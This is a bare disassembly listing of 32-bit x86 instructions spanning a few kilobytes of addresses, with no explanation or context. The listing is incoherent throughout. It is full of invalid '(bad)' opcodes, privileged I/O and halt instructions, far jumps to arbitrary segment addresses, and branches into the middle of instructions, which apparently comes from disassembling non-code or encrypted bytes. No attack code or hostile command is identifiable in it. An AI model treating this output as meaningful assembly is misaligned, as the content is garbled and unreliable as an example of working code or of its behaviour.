  41931b:	dec    edx
  41931c:	in     eax,dx
  41931d:	mov    al,0x39
  41931f:	aam    0xf8
  419321:	jmp    0x600b:0x9681edd2
  419328:	pop    DWORD PTR [ebx]
  41932a:	imul   ebx,DWORD PTR [ecx+0xd],0x3446091e
  419331:	mov    ?,WORD PTR [esi-0x43bd3e5f]
  419337:	add    BYTE PTR [edx-0x1a],bl
  41933a:	or     bh,BYTE PTR [eax]
  41933c:	xchg   DWORD PTR [edi+esi*4-0x2eb8aafa],ebx
  419343:	(bad)  
  419344:	xchg   esi,eax
  419345:	pop    ecx
  419346:	dec    ecx
  419347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419348:	loopne 0x419392
  41934a:	jne    0x41933e
  41934c:	adc    DWORD PTR [ebp+0x5],edi
  41934f:	idiv   BYTE PTR [esi]
  419351:	pop    eax
  419352:	stc    
  419353:	loopne 0x419314
  419355:	hlt    
  419356:	shr    DWORD PTR [esi+edi*1+0x2f],0x6f
  41935b:	rcl    DWORD PTR [edi+0x75],cl
  41935e:	ds aad 0xa9
  419361:	(bad)  [ecx]
  419363:	pop    esi
  419364:	xlat   BYTE PTR ds:[ebx]
  419365:	mov    ah,0x0
  419367:	pop    edx
  419368:	popf   
  419369:	gs xchg edi,eax
  41936b:	jmp    0x7f94:0x97571bf7
  419372:	leave  
  419373:	shr    DWORD PTR [esi-0xa],1
  419376:	sbb    ebp,DWORD PTR [esi-0x77]
  419379:	mov    bh,0xeb
  41937b:	xchg   edi,eax
  41937c:	pop    ds
  41937d:	push   eax
  41937e:	push   0x11cc2c31
  419383:	fldenv [ebp+ebp*8-0x6a]
  419387:	ss jl  0x419384
  41938a:	sub    eax,0xb12bbab3
  41938f:	sbb    DWORD PTR [ebx+0x67],ebx
  419392:	arpl   WORD PTR [ebx-0x1c],bp
  419395:	js     0x4193cd
  419397:	mov    ebx,0x71f12922
  41939c:	push   ss
  41939d:	pop    ebp
  41939e:	xor    DWORD PTR [ecx+0x3055a496],ebp
  4193a4:	xchg   DWORD PTR [ebp-0x16b28d16],edi
  4193aa:	hlt    
  4193ab:	xor    bl,dh
  4193ad:	rol    eax,1
  4193af:	popa   
  4193b0:	ds adc al,0xc1
  4193b3:	sbb    dh,BYTE PTR [eax-0x34]
  4193b6:	push   cs
  4193b7:	jle    0x4193bf
  4193b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ba:	jmp    0xa7ef:0xa85fe1b7
  4193c1:	inc    BYTE PTR [edi+0x5166eedd]
  4193c7:	outs   dx,BYTE PTR ds:[esi]
  4193c8:	dec    eax
  4193c9:	sbb    bl,BYTE PTR [ecx-0x5a003d82]
  4193cf:	pop    esp
  4193d0:	rol    ebp,0xc
  4193d3:	and    dh,BYTE PTR [edx-0x7d]
  4193d6:	dec    ebx
  4193d7:	pushf  
  4193d8:	icebp  
  4193d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193da:	(bad)  
  4193db:	and    ch,bh
  4193dd:	hlt    
  4193de:	jmp    0x8e2d341f
  4193e3:	loopne 0x419419
  4193e5:	cli    
  4193e6:	dec    ebp
  4193e7:	aad    0x51
  4193e9:	in     eax,0xc0
  4193eb:	xchg   ecx,ecx
  4193ed:	mov    ecx,0xc55006c1
  4193f2:	adc    DWORD PTR [esi+eiz*2-0x50],edx
  4193f6:	mov    DWORD PTR fs:[ebp+edi*4-0x42],eax
  4193fb:	push   ebx
  4193fc:	jae    0x419460
  4193fe:	mov    ds:0x85c3af33,eax
  419403:	in     eax,0x72
  419405:	loope  0x41943d
  419407:	fidivr DWORD PTR [edx]
  419409:	mov    eax,0x5057c4e5
  41940e:	push   ss
  41940f:	xor    esp,edi
  419411:	jge    0x419395
  419413:	fcmovnu st,st(0)
  419415:	mov    esp,0x118207e3
  41941a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41941b:	cld    
  41941c:	mov    ds:0x9c61578d,al
  419421:	es aaa 
  419423:	xor    DWORD PTR [edi-0x72],ebx
  419426:	(bad)  
  419427:	fnstcw WORD PTR [ecx+0x2e]
  41942a:	rcl    esp,cl
  41942c:	or     DWORD PTR [eax+0x1c],esp
  41942f:	push   0x7
  419431:	jge    0x4193f1
  419433:	mov    esi,0xd5932b8b
  419438:	(bad)  
  419439:	clc    
  41943a:	cli    
  41943b:	push   0xffffffad
  41943d:	fidiv  WORD PTR [esi]
  41943f:	fdiv   DWORD PTR [eax+0x6a7a2925]
  419445:	icebp  
  419446:	cmc    
  419447:	jbe    0x419467
  419449:	push   es
  41944a:	sub    ch,BYTE PTR [edx-0x1d]
  41944d:	lea    edi,[ebx+0x4df0eea1]
  419453:	cmp    bh,BYTE PTR es:[esi-0x1968956a]
  41945a:	je     0x4194ab
  41945c:	add    esi,DWORD PTR [esp+eax*2+0x63bb032f]
  419463:	iret   
  419464:	mov    al,0x7
  419466:	sti    
  419467:	dec    edi
  419468:	jnp    0x41941d
  41946a:	test   al,0xee
  41946c:	push   edx
  41946d:	sub    ecx,ebp
  41946f:	and    ebx,DWORD PTR [edi+0x4f]
  419472:	addr16 xchg esi,eax
  419474:	inc    ecx
  419475:	pop    esi
  419476:	inc    eax
  419477:	addr16 adc al,0x61
  41947a:	xor    bh,ch
  41947c:	hlt    
  41947d:	stos   BYTE PTR es:[edi],al
  41947e:	in     eax,0x40
  419480:	sub    ebx,DWORD PTR [ebx]
  419482:	push   0x56
  419484:	and    DWORD PTR [esi],ebx
  419486:	and    DWORD PTR [eax],edi
  419488:	dec    edi
  419489:	outs   dx,BYTE PTR ds:[esi]
  41948a:	std    
  41948b:	and    eax,ecx
  41948d:	xchg   esi,eax
  41948e:	xchg   edx,eax
  41948f:	scas   al,BYTE PTR es:[di]
  419491:	in     al,dx
  419492:	test   eax,0x83195f14
  419497:	pusha  
  419498:	adc    bh,bl
  41949a:	dec    edi
  41949b:	inc    ecx
  41949c:	xchg   esp,eax
  41949d:	sbb    BYTE PTR [eax-0x42],dl
  4194a0:	loopne 0x41943e
  4194a2:	adc    al,0x1c
  4194a4:	push   ss
  4194a5:	(bad)  
  4194a6:	stos   DWORD PTR es:[edi],eax
  4194a7:	clc    
  4194a8:	or     dl,bl
  4194aa:	lods   al,BYTE PTR ds:[esi]
  4194ab:	mov    edx,0xb2bca72b
  4194b0:	add    ebx,DWORD PTR [edx-0x95a9710]
  4194b6:	out    dx,al
  4194b7:	xchg   ebx,eax
  4194b8:	jg     0x41951d
  4194ba:	mov    esi,0xd2006b14
  4194bf:	test   eax,0x41dd3c58
  4194c4:	ins    DWORD PTR es:[edi],dx
  4194c5:	fwait
  4194c6:	xor    al,0xd6
  4194c8:	or     al,0xf7
  4194ca:	inc    edx
  4194cb:	imul   eax,DWORD PTR [eax-0x70],0xf4d6d240
  4194d2:	stos   DWORD PTR es:[edi],eax
  4194d3:	mov    ch,0x28
  4194d5:	jl     0x419510
  4194d7:	push   cs
  4194d8:	jb     0x41945a
  4194da:	popa   
  4194db:	jg     0x4194de
  4194dd:	sbb    cl,BYTE PTR [ecx+0x1e5ede3]
  4194e3:	xlat   BYTE PTR ds:[ebx]
  4194e4:	ins    DWORD PTR es:[edi],dx
  4194e5:	xor    DWORD PTR [eax+0x7414418],esi
  4194eb:	cmc    
  4194ec:	mov    al,0xa0
  4194ee:	mov    ch,0x56
  4194f0:	mov    ecx,0x7eb6c309
  4194f5:	call   FWORD PTR [edx+0x4b]
  4194f8:	cmc    
  4194f9:	(bad)  
  4194fb:	outs   dx,BYTE PTR ds:[esi]
  4194fc:	xchg   esi,eax
  4194fd:	add    ah,cl
  4194ff:	retf   0xec75
  419502:	push   ebp
  419503:	in     eax,0xaa
  419505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419506:	aad    0x90
  419508:	cdq    
  419509:	jb     0x4194ac
  41950b:	or     DWORD PTR [ebx-0x1f],ebx
  41950e:	sbb    ebx,esp
  419510:	addr16 xor esi,ecx
  419513:	sub    BYTE PTR [esi-0x1c],ah
  419516:	adc    al,0x97
  419518:	and    DWORD PTR [esi],0xee9fd979
  41951e:	jmp    0x419512
  419520:	jae    0x41950e
  419522:	ret    
  419523:	mov    al,0xf1
  419525:	dec    esp
  419526:	dec    ebx
  419527:	and    eax,0x5a0de20b
  41952c:	nop
  41952d:	cmp    al,0x3e
  41952f:	aaa    
  419530:	fs push cs
  419532:	jge    0x41950e
  419534:	nop
  419535:	pop    ds
  419536:	push   0x52323792
  41953b:	xchg   ecx,eax
  41953c:	enter  0x1e52,0x3d
  419540:	or     eax,0xf80e8e1c
  419546:	ffreep st(2)
  419548:	addr16 dec ebp
  41954a:	add    BYTE PTR [ebp+0x3db6d1aa],bh
  419550:	test   BYTE PTR [eax+ebp*2+0x77],bh
  419554:	mov    ecx,0xf1cf894c
  419559:	and    dh,BYTE PTR [esi+0x1aed1bc4]
  41955f:	pop    es
  419560:	sub    bh,ch
  419562:	add    ah,BYTE PTR [ebp-0x13c32fa4]
  419568:	pusha  
  419569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41956a:	popf   
  41956b:	iret   
  41956c:	clc    
  41956d:	push   0xffffff85
  41956f:	push   eax
  419570:	sub    eax,0xb165fd0
  419575:	aam    0x59
  419577:	push   ebp
  419578:	push   cs
  419579:	mov    BYTE PTR [edi+0x69],ah
  41957c:	mov    ah,0x18
  41957e:	pop    edx
  41957f:	push   0x42f5610a
  419584:	mov    ah,0x66
  419586:	jnp    0x419508
  419588:	sub    al,0xbe
  41958a:	cmp    bh,dl
  41958c:	aam    0xf0
  41958e:	fwait
  41958f:	aas    
  419590:	xchg   edi,eax
  419591:	aas    
  419592:	test   edi,esp
  419594:	(bad)  
  419595:	clc    
  419596:	adc    DWORD PTR [edi],ebx
  419598:	sti    
  419599:	iret   
  41959a:	(bad)  
  41959b:	ins    BYTE PTR es:[edi],dx
  41959c:	dec    ebx
  41959d:	nop
  41959e:	pop    ebx
  41959f:	cmp    al,0x7c
  4195a1:	int    0xe0
  4195a3:	sti    
  4195a4:	stc    
  4195a5:	dec    ebp
  4195a6:	xchg   ebp,eax
  4195a7:	aas    
  4195a8:	pop    ebx
  4195a9:	shl    bl,1
  4195ab:	scas   eax,DWORD PTR es:[edi]
  4195ac:	push   ss
  4195ad:	loop   0x41957c
  4195af:	(bad)  
  4195b0:	mov    bl,0x4e
  4195b2:	stc    
  4195b3:	imul   esp,DWORD PTR [ecx-0x60],0x30250b40
  4195ba:	pop    ds
  4195bb:	jmp    0xb266:0x8ac78bd9
  4195c2:	out    0xf1,eax
  4195c4:	aad    0xbb
  4195c6:	pusha  
  4195c7:	shr    ch,1
  4195c9:	stos   DWORD PTR es:[edi],eax
  4195ca:	sub    DWORD PTR [edi+0x6cd68c47],edi
  4195d0:	pop    ebx
  4195d1:	icebp  
  4195d2:	stos   BYTE PTR es:[edi],al
  4195d3:	sbb    esp,DWORD PTR ds:0xe0ebe188
  4195d9:	stos   BYTE PTR es:[edi],al
  4195da:	and    al,0x9
  4195dc:	cmp    eax,0x49bfe891
  4195e1:	fwait
  4195e2:	dec    ebp
  4195e3:	add    eax,0x76fae68
  4195e8:	rcl    BYTE PTR [eax+eax*1-0x3],cl
  4195ec:	mov    ds:0x34098bb6,eax
  4195f1:	ror    DWORD PTR [ebx],cl
  4195f3:	inc    ebx
  4195f4:	test   ch,0xad
  4195f7:	cmp    edi,DWORD PTR [ebx+0x2d]
  4195fa:	xor    ebx,DWORD PTR [eax+0x12]
  4195fd:	in     eax,0xbe
  4195ff:	sub    esp,DWORD PTR [edx-0x80]
  419602:	ja     0x41964e
  419604:	mov    al,ds:0x8f58ee9b
  419609:	push   ebx
  41960a:	mov    bh,0xd3
  41960c:	mov    DWORD PTR [esi+0xd],esp
  41960f:	add    esi,DWORD PTR [ebp+0x15bce61a]
  419615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419616:	or     al,0x3b
  419618:	mov    ah,0xac
  41961a:	jg     0x4195ec
  41961c:	dec    esp
  41961d:	adc    ch,BYTE PTR [ebx-0x6b]
  419620:	push   edx
  419621:	les    eax,FWORD PTR [edi-0x4506fd8a]
  419627:	arpl   WORD PTR [eax-0x46a6f105],bx
  41962d:	ret    0x68df
  419630:	dec    esp
  419631:	fs mov esi,0x41159765
  419637:	leave  
  419638:	and    eax,0xdabc9780
  41963d:	jp     0x419661
  41963f:	mov    ch,0x62
  419641:	ret    
  419642:	mov    dh,dh
  419644:	enter  0x22a5,0x3
  419648:	addr16 repz imul edx,ebx,0x40
  41964d:	sub    DWORD PTR [edx+eiz*2],esi
  419650:	shr    BYTE PTR [esi+0xc610ea0],0x7c
  419657:	pop    eax
  419658:	sbb    DWORD PTR es:[eax+ebx*8],edi
  41965c:	dec    ecx
  41965d:	or     cl,BYTE PTR [ecx+0x3b422287]
  419663:	rcr    edx,1
  419665:	jmp    0x419664
  419667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419668:	cmovge ebx,DWORD PTR [ebx+0x5d87ca27]
  41966f:	shl    BYTE PTR [edx],0x2a
  419672:	jmp    0xf777:0x51b88c1f
  419679:	xchg   ecx,eax
  41967a:	mov    cl,0xe0
  41967c:	adc    BYTE PTR [ecx-0x26],cl
  41967f:	push   edi
  419680:	or     DWORD PTR [ebx+eax*4-0x31e15a36],eax
  419687:	lock jmp 0x4196ef
  41968a:	xor    BYTE PTR [ebp+0x2dae9583],cl
  419690:	pop    eax
  419691:	push   ecx
  419692:	mov    ah,0x33
  419694:	xor    eax,0x8a9c13b0
  419699:	mov    ebx,DWORD PTR [ebx+edx*4+0x54a7d4d1]
  4196a0:	sub    bl,bh
  4196a2:	push   esi
  4196a3:	jmp    0x882a:0xf41b8d14
  4196aa:	inc    ecx
  4196ab:	dec    ebx
  4196ac:	adc    eax,ebp
  4196ae:	jp     0x41968f
  4196b0:	and    al,dh
  4196b2:	mov    ebx,0x12c11c4b
  4196b7:	and    ebx,DWORD PTR [edx-0x5b127b9e]
  4196bd:	fld    TBYTE PTR [edi]
  4196bf:	divps  xmm5,XMMWORD PTR [edi-0x5]
  4196c3:	or     eax,0xfcdd676e
  4196c8:	(bad)  [edx+ebp*4-0x34]
  4196cc:	retf   
  4196cd:	and    eax,0x2e148857
  4196d2:	add    BYTE PTR [eax-0x59],bh
  4196d5:	jg     0x4196e9
  4196d7:	inc    edx
  4196d8:	ss fmul st(4),st
  4196db:	data16 mov sp,0xfe6a
  4196e0:	sub    BYTE PTR [esi+0x71],al
  4196e3:	(bad)  
  4196e4:	popa   
  4196e5:	add    bl,BYTE PTR [edi]
  4196e7:	jo     0x4196cd
  4196e9:	cs fabs 
  4196ec:	jnp    0x4196e4
  4196ee:	ds imul ebx,eax,0x6545d43f
  4196f5:	cmp    BYTE PTR [esi+0x4b5bdcbd],cl
  4196fb:	adc    dh,ah
  4196fd:	push   ebp
  4196fe:	add    DWORD PTR [ebx],edi
  419700:	pop    es
  419701:	ja     0x419746
  419703:	call   0xba0dfbf0
  419708:	sbb    DWORD PTR [ebx+eiz*1],ebx
  41970b:	pop    edx
  41970c:	les    eax,FWORD PTR [esi]
  41970e:	jg     0x41973b
  419710:	lea    ebp,[ecx-0x7d]
  419713:	or     dl,BYTE PTR [edi+esi*4]
  419716:	scas   al,BYTE PTR es:[edi]
  419717:	add    bl,al
  419719:	add    BYTE PTR [esi],ah
  41971b:	test   eax,0xbe6f9e3f
  419720:	repnz push es
  419722:	out    dx,al
  419723:	cli    
  419724:	mov    al,ds:0x68b68977
  419729:	(bad)  
  41972a:	icebp  
  41972b:	xchg   esp,eax
  41972c:	je     0x4196c1
  41972e:	adc    DWORD PTR gs:[edi+0x15],edi
  419732:	adc    al,bh
  419734:	aad    0x32
  419736:	rcr    esi,0x43
  419739:	popa   
  41973a:	inc    ebx
  41973b:	and    esp,DWORD PTR [ecx+0x16]
  41973e:	pusha  
  41973f:	rol    ah,1
  419741:	icebp  
  419742:	retf   0x3c0c
  419745:	push   edx
  419746:	loopne 0x4196e9
  419748:	gs add bl,bl
  41974b:	setns  BYTE PTR [ecx]
  41974e:	adc    DWORD PTR [edx-0x3],ebx
  419751:	pop    esp
  419752:	nop
  419753:	int    0xd5
  419755:	add    esi,DWORD PTR [esi-0x6ae487cc]
  41975b:	add    DWORD PTR [esi],0x1c
  41975e:	cmc    
  41975f:	mov    bl,0x1c
  419761:	out    0x9f,eax
  419763:	sub    BYTE PTR [ebx-0x2d198599],0xc
  41976a:	push   ebp
  41976b:	dec    eax
  41976c:	loop   0x419730
  41976e:	adc    eax,0xfb6eb071
  419773:	and    eax,0xcc4d11e8
  419778:	jge    0x419768
  41977a:	test   al,0xc6
  41977c:	(bad)  
  41977d:	jno    0x4197c0
  41977f:	mov    bh,0xe
  419781:	mov    fs,WORD PTR gs:[ebx-0x26ae96cb]
  419788:	int3   
  419789:	les    eax,FWORD PTR [edi]
  41978b:	ret    
  41978c:	xor    DWORD PTR [esp+edi*1-0x1f],0xffffffd4
  419791:	fsubp  st(5),st
  419793:	or     eax,ebp
  419795:	sti    
  419796:	test   ch,bh
  419798:	mov    ebp,0x1996375
  41979d:	fwait
  41979e:	aas    
  41979f:	nop
  4197a0:	fcmovne st,st(3)
  4197a2:	out    0xa1,eax
  4197a4:	fst    QWORD PTR [esi]
  4197a6:	pop    edx
  4197a7:	mov    dl,0x45
  4197a9:	fs out 0xb4,al
  4197ac:	fst    QWORD PTR [edx]
  4197ae:	je     0x4197de
  4197b0:	adc    edx,ebx
  4197b2:	mov    ecx,0x93330cc6
  4197b7:	iret   
  4197b8:	push   0x3daac243
  4197bd:	xchg   esi,eax
  4197be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197bf:	cmp    eax,0xb6805619
  4197c4:	cwde   
  4197c5:	das    
  4197c6:	cmp    ecx,edx
  4197c8:	loope  0x419843
  4197ca:	addr16 dec esi
  4197cc:	daa    
  4197cd:	mov    eax,0x6bf52cbb
  4197d2:	fucomp st(1)
  4197d4:	inc    ebp
  4197d5:	jecxz  0x419795
  4197d7:	(bad)
  4197db:	cmp    BYTE PTR [ecx-0x52108d4f],dh
  4197e1:	xchg   esi,eax
  4197e2:	pop    es
  4197e3:	out    0x2d,al
  4197e5:	frstor [ebx+edx*2]
  4197e8:	jp     0x4197b2
  4197ea:	mov    ah,0xb7
  4197ec:	and    BYTE PTR [ecx],al
  4197ee:	pop    ecx
  4197ef:	pop    esi
  4197f0:	(bad)  
  4197f1:	pop    esp
  4197f2:	mov    WORD PTR [esp+edx*4+0x1184b953],?
  4197f9:	cld    
  4197fa:	js     0x4197f2
  4197fc:	mov    dl,0x94
  4197fe:	and    ah,BYTE PTR [ebp+edi*1-0x24]
  419802:	inc    eax
  419803:	sar    BYTE PTR [edx-0x522a7119],0x41
  41980a:	or     eax,0x47222afd
  41980f:	jne    0x4197e7
  419811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419812:	cmp    bh,BYTE PTR [ecx+0x1ce62966]
  419818:	rol    DWORD PTR [ebp+0x60],1
  41981b:	mov    edi,0x43897d74
  419820:	(bad)  
  419821:	ror    BYTE PTR [edi+0x6f],cl
  419824:	pop    ds
  419825:	pop    es
  419826:	std    
  419827:	jle    0x41982f
  419829:	call   0x550d44b5
  41982e:	mov    ebp,0x8d4efb03
  419833:	dec    edx
  419834:	push   esp
  419835:	call   0x9c40:0x84f94e98
  41983c:	cmc    
  41983d:	ins    BYTE PTR es:[edi],dx
  41983e:	gs std 
  419840:	mov    BYTE PTR ds:0x73b115bf,ch
  419846:	retf   
  419847:	sti    
  419848:	outs   dx,BYTE PTR ds:[esi]
  419849:	pop    ebp
  41984a:	test   DWORD PTR [esp+esi*1+0x27db7912],edx
  419851:	xchg   ecx,eax
  419852:	mov    eax,ds:0x19c9e42
  419857:	mov    bl,0x64
  419859:	bnd jp 0x41986d
  41985c:	nop
  41985d:	out    0xc0,eax
  41985f:	sub    eax,0x647a148e
  419864:	jns    0x419825
  419866:	push   ebp
  419867:	in     al,dx
  419868:	mov    ds:0x44c471ec,al
  41986d:	(bad)  
  41986e:	fwait
  41986f:	add    ecx,edx
  419871:	mov    ds:0xa1aa8f71,al
  419876:	gs xor al,0xda
  419879:	mov    edx,0x90a9939
  41987e:	inc    edx
  41987f:	jp     0x4198ed
  419881:	adc    ecx,DWORD PTR [ecx-0x43557853]
  419887:	cmp    BYTE PTR [edx+0x6b],0x96
  41988b:	fwait
  41988c:	jge    0x419884
  41988e:	fbld   TBYTE PTR [ecx]
  419890:	inc    ecx
  419891:	in     eax,dx
  419892:	push   ecx
  419893:	js     0x419827
  419895:	jno    0x419818
  419897:	clc    
  419898:	and    al,0xf2
  41989a:	inc    edi
  41989b:	fdivr  st(4),st
  41989d:	outs   dx,BYTE PTR ds:[esi]
  41989e:	pop    esp
  41989f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198a0:	jge    0x4198ac
  4198a2:	outs   dx,BYTE PTR ds:[esi]
  4198a3:	push   edi
  4198a4:	mov    ds:0x83f532cd,eax
  4198a9:	gs ret 0x42da
  4198ad:	int    0x3e
  4198af:	fcom   DWORD PTR ds:0xf19bf3a0
  4198b5:	mov    bh,ah
  4198b7:	call   eax
  4198b9:	push   esi
  4198ba:	cdq    
  4198bb:	rol    DWORD PTR [esi-0x7a],cl
  4198be:	inc    ebp
  4198bf:	mov    al,ds:0xf0871bb8
  4198c4:	mov    dl,0xb2
  4198c6:	fdiv   DWORD PTR [edx-0x4e]
  4198c9:	inc    edi
  4198ca:	add    DWORD PTR [eax-0x27],ecx
  4198cd:	dec    ecx
  4198ce:	jle    0x4198a1
  4198d0:	scas   eax,DWORD PTR es:[edi]
  4198d1:	daa    
  4198d2:	pop    ss
  4198d3:	sub    bh,BYTE PTR [ebx+0xfb68bc6]
  4198d9:	pop    edi
  4198da:	jae    0x419954
  4198dc:	or     DWORD PTR [edi+0x35],esi
  4198df:	fild   WORD PTR [edi+ebp*4+0x3e0f912a]
  4198e6:	int3   
  4198e7:	lds    esp,FWORD PTR [esp+esi*2]
  4198ea:	or     eax,0x1f8eee32
  4198ef:	popa   
  4198f0:	test   WORD PTR [edx-0x5d],cx
  4198f4:	inc    ecx
  4198f5:	scas   al,BYTE PTR es:[edi]
  4198f6:	mov    eax,ds:0xa74e18b7
  4198fb:	ins    BYTE PTR es:[edi],dx
  4198fc:	adc    BYTE PTR [ebp-0x38],ah
  4198ff:	cmp    DWORD PTR [edi-0x23],ecx
  419902:	xor    al,0xa6
  419904:	das    
  419905:	xchg   ebp,eax
  419906:	pop    ebx
  419907:	test   eax,0x7d389817
  41990c:	dec    ecx
  41990d:	jno    0x4198b8
  41990f:	push   edx
  419910:	retf   
  419911:	dec    DWORD PTR [esi-0xad1df7a]
  419917:	inc    esp
  419918:	call   0xbc2c:0x8bfc02ea
  41991f:	or     ebp,ebx
  419921:	call   0x59e3:0xff2d858f
  419928:	stos   DWORD PTR es:[edi],eax
  419929:	repz adc BYTE PTR [esi+0x781723d1],0xfb
  419931:	inc    ebp
  419932:	push   esp
  419933:	sub    BYTE PTR [edx-0x21],bh
  419936:	test   DWORD PTR [esi+0x34f4e65f],edi
  41993c:	mov    al,0xb5
  41993e:	add    eax,0x2a783315
  419943:	ja     0x419916
  419945:	sti    
  419946:	rcr    DWORD PTR [edi-0x26],0x98
  41994a:	fistp  DWORD PTR [eax]
  41994c:	outs   dx,BYTE PTR ds:[esi]
  41994d:	mov    BYTE PTR [ebp+eax*1+0x2e396680],dh
  419954:	push   ds
  419955:	aaa    
  419956:	ja     0x419944
  419958:	adc    al,0x8c
  41995a:	pop    edx
  41995b:	arpl   ax,ax
  41995d:	shr    bl,cl
  41995f:	jl     0x4198eb
  419961:	mov    es,edx
  419963:	sbb    esp,eax
  419965:	rol    BYTE PTR [eax-0x59395f5],cl
  41996b:	add    BYTE PTR [ecx-0x7e],dl
  41996e:	outs   dx,BYTE PTR ds:[esi]
  41996f:	cdq    
  419970:	(bad)  
  419971:	jp     0x41997b
  419973:	sbb    al,0xf4
  419975:	pop    ss
  419976:	scas   al,BYTE PTR es:[edi]
  419977:	popa   
  419978:	arpl   WORD PTR [ebx+eax*1-0x7fa8a659],bp
  41997f:	mov    esi,0xab27a9cb
  419984:	pop    esi
  419985:	push   cs
  419986:	(bad)  
  419987:	and    ch,BYTE PTR [ebx]
  419989:	pop    edx
  41998a:	cdq    
  41998b:	dec    ebp
  41998c:	cmc    
  41998d:	in     eax,dx
  41998e:	mov    dh,0x92
  419990:	sub    esi,DWORD PTR ds:0x7c35cde4
  419996:	or     BYTE PTR [ecx],dh
  419998:	xchg   edi,eax
  419999:	mov    esi,0xf7b9d4c9
  41999e:	inc    ecx
  41999f:	sub    al,0xfb
  4199a1:	mov    bl,BYTE PTR [edi-0x633222ea]
  4199a7:	jmp    0x4199a8
  4199a9:	mov    DWORD PTR [eax-0x491393e4],ebp
  4199af:	les    eax,FWORD PTR [eax]
  4199b1:	adc    dl,dh
  4199b3:	inc    ecx
  4199b4:	test   DWORD PTR [eax-0x611a7280],edi
  4199ba:	or     al,0xe
  4199bc:	jmp    0x6d53:0x44a7d7cc
  4199c3:	les    esi,FWORD PTR fs:[eax+0x7ca152f9]
  4199ca:	cmp    DWORD PTR [ebx],ebx
  4199cc:	stc    
  4199cd:	dec    ebx
  4199ce:	xchg   ebx,eax
  4199cf:	sub    ebx,ecx
  4199d1:	pop    ebx
  4199d2:	int3   
  4199d3:	ret    
  4199d4:	fwait
  4199d5:	adc    eax,0x32ec8301
  4199da:	dec    ebx
  4199db:	dec    eax
  4199dc:	xchg   edi,eax
  4199dd:	aaa    
  4199de:	stc    
  4199df:	sahf   
  4199e0:	adc    ebx,ecx
  4199e2:	icebp  
  4199e3:	mov    ah,0x37
  4199e5:	push   es
  4199e6:	in     al,dx
  4199e7:	and    al,0xdf
  4199e9:	aas    
  4199ea:	retf   
  4199eb:	add    al,0x82
  4199ed:	outs   dx,DWORD PTR ds:[esi]
  4199ee:	xchg   DWORD PTR [edi],edi
  4199f0:	mov    DWORD PTR [edi],ebp
  4199f2:	pcmpgtw mm5,mm5
  4199f5:	dec    edi
  4199f6:	inc    eax
  4199f7:	jnp    0x4199b6
  4199f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199fa:	scas   eax,DWORD PTR es:[edi]
  4199fb:	mov    esi,eax
  4199fd:	stc    
  4199fe:	sub    ecx,DWORD PTR [esi+0x7752c22e]
  419a04:	inc    edx
  419a05:	(bad)  
  419a06:	mov    dh,0x42
  419a08:	es in  al,dx
  419a0a:	in     al,0xf7
  419a0c:	pop    eax
  419a0d:	jns    0x419a7b
  419a0f:	retf   0x675b
  419a12:	es xchg edi,eax
  419a14:	clc    
  419a15:	lahf   
  419a16:	rol    DWORD PTR [edi-0x7d30c9b5],1
  419a1c:	aad    0xd
  419a1e:	inc    edx
  419a1f:	jbe    0x4199e0
  419a21:	mov    ch,0x3e
  419a23:	inc    esi
  419a24:	ror    DWORD PTR ds:0xda6f4b61,0xe4
  419a2b:	adc    al,0xd6
  419a2d:	int3   
  419a2e:	test   al,0xce
  419a30:	les    edx,FWORD PTR [ebx+esi*2+0x32]
  419a34:	and    eax,0x1c01ef4d
  419a39:	xchg   bh,ah
  419a3b:	cdq    
  419a3c:	loope  0x419a84
  419a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a3f:	xchg   ebx,eax
  419a40:	sbb    edi,DWORD PTR [edi+0x26]
  419a43:	cwde   
  419a44:	mov    ds:0x137487bc,al
  419a49:	jmp    0x419a9b
  419a4b:	jbe    0x419a5a
  419a4d:	fild   QWORD PTR ds:0x6401c6ae
  419a53:	(bad)  
  419a54:	(bad)  
  419a56:	dec    ebx
  419a57:	mov    ds:0x34735a25,al
  419a5c:	in     al,0xc7
  419a5e:	push   cs
  419a5f:	popa   
  419a60:	inc    edi
  419a61:	mov    al,ds:0xe59623f2
  419a66:	out    0x1e,eax
  419a68:	xchg   DWORD PTR [esp+esi*4+0x6150445e],eax
  419a6f:	ds add edi,ecx
  419a72:	imul   esi,ebx,0xd49a04d4
  419a78:	jp     0x419a8b
  419a7a:	push   es
  419a7b:	xchg   BYTE PTR [edx],bl
  419a7d:	pop    ebp
  419a7e:	dec    esp
  419a7f:	push   es
  419a80:	mov    al,0x29
  419a82:	scas   al,BYTE PTR es:[edi]
  419a83:	hlt    
  419a84:	call   0x3bdda90b
  419a89:	cmp    dl,BYTE PTR [esi+0x5]
  419a8c:	or     ebp,DWORD PTR [esi+0x4b]
  419a8f:	xchg   DWORD PTR [ebx+0x6b],edx
  419a92:	jecxz  0x419aa1
  419a94:	mov    eax,ds:0x4de881ef
  419a99:	push   ebx
  419a9a:	pusha  
  419a9b:	dec    esi
  419a9c:	adc    al,ch
  419a9e:	mov    dh,0x8f
  419aa0:	mov    bl,0x56
  419aa2:	pop    ecx
  419aa3:	adc    BYTE PTR [edi],0x4f
  419aa6:	clc    
  419aa7:	les    edx,FWORD PTR [ebx+0x2d]
  419aaa:	(bad)  
  419aab:	cmp    al,BYTE PTR [edx]
  419aad:	and    al,0xb2
  419aaf:	stos   DWORD PTR es:[edi],eax
  419ab0:	push   ecx
  419ab1:	out    0x9e,eax
  419ab3:	xchg   ch,bh
  419ab5:	push   ds
  419ab6:	inc    edi
  419ab7:	in     eax,dx
  419ab8:	push   ecx
  419ab9:	mov    al,al
  419abb:	mov    WORD PTR [edi-0x29],?
  419abe:	dec    edi
  419abf:	jne    0x419a95
  419ac1:	neg    ah
  419ac3:	icebp  
  419ac4:	scas   al,BYTE PTR es:[edi]
  419ac5:	ja     0x419aa2
  419ac7:	dec    esi
  419ac8:	jb     0x419ade
